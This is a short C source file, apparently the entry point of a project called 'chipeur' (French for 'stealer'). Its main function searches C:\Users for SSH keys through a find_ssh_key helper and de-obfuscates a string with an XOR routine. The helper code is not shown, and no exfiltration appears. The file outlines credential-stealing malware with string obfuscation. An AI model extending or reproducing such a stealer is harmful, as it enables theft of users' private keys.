#include "chipeur.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "find_ssh_key.h"
#include "obfuscation.h"

void hello(void) { printf("Hello World\n"); }

int main(void) {
  find_ssh_key(L"C:\\Users");

  char str[] = "BOFFE";
  xor_str(str, strlen(str));
  printf("%s", str);

  return EXIT_SUCCESS;
}
